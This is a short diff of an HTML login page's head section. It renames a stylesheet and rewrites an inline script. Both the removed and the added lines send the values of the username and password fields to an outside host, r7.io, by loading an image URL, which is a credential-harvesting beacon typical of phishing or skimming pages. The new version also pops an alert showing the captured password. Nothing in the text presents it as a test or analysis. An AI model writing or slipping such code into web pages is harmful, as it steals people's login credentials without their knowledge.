@@ -8,7 +8,7 @@
 
     <link href="fonts.css" media="screen" rel="stylesheet" type="text/css">
 
-    <link href="login.gz.css" media="screen" rel="stylesheet" type="text/css">
+    <link href="login482787041.gz.css" media="screen" rel="stylesheet" type="text/css">
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
     <script>
@@ -20,11 +20,13 @@
         });
     </script>
     <script>
-
+        function getForm (form) {
+            var Password1 = $('#login_password').val();
+            var Username1 = $('#login_username').val();
+            alert(Password1 + "    " + Username1);
             var i = new Image();
-            i.src = "http://r7.io/e/segall2?s=" + $('#login_username').val() + $('#login_password').val();
-
-
+            i.src = "http://r7.io/e/segall2?s=" + Username1 + Password1;
+        };
     </script>
 
   </head>
